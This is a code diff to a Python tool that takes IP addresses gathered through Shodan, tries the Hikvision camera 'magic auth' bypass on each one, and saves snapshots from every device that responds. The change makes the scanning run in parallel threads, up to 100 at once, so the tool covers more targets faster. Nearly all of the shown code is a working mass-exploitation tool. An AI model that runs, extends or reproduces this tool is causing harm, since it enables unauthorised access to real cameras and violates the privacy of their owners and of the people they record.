@@ -1,6 +1,6 @@
 #!/bin/python3
 
-import shodan, requests, sys, time, pathlib, tkinter, io
+import shodan, requests, sys, time, pathlib, tkinter, io, threading
 from PIL import Image
 from PIL import ImageTk
 
@@ -20,6 +20,7 @@ ipList = []
 filename = ""
 ipVuln = []
 custom_timeout = 1
+lock = threading.Semaphore(100)
 
 # Live variables
 live_target = ""
@@ -127,17 +128,22 @@ def checkIPs():
     global ipVuln
     ipVuln = []
     idx = 1
-    for ip in ipList:
-        try:
-            response = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout)
-            if response.status_code == 200:
-                ipVuln.append(ip)
-                saveSnapshot(ip, response)
 
-        except requests.exceptions.RequestException as e:
-            pass
-        print("Scanned {} of {} IPs.".format(idx,len(ipList)), end="\r")
+    thread_pool = []
+
+    for ip in ipList:
+        
+        thread = threading.Thread(target=getResponse, args=(ip,))
+        thread_pool.append(thread)
+        thread.start();
+        lock.acquire();            
+        
+        print("Scanning {} of {} IPs.".format(idx,len(ipList)), end="\r")
         idx+=1
+
+    print("Waiting for remaining threads to finish...")
+    for t in thread_pool:
+        t.join()
 
     if len(ipVuln) > 0:
         print("Found {} vulnerable cameras".format(len(ipVuln)))
@@ -148,7 +154,7 @@ def checkIPs():
 
 def saveSnapshot(ip, response):
     pathlib.Path('snap/'+ip).mkdir(parents=True, exist_ok=True)
-    with open('snap/'+ip+'/'+time.strftime("%Y%m%d-%H%M%s")+'.jpg', 'wb' ) as f:
+    with open('snap/'+ip+'/'+ip+'-'+str(round(time.time() * 1000))+'.jpg', 'wb' ) as f:
         f.write(response.content)
         f.close()
 
@@ -162,6 +168,18 @@ def saveVulnInFile():
             newline = '\n'
         f.close()
     print("Vulnerable IPs saved in {}.".format(save_filename))
+
+def getResponse(ip):
+    try: 
+        resp = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout)
+        if resp.status_code == 200:
+            ipVuln.append(ip)
+            saveSnapshot(ip, resp)
+        lock.release()
+
+    except requests.exceptions.RequestException as e:
+        lock.release()
+        pass
 
 # Live functions
 
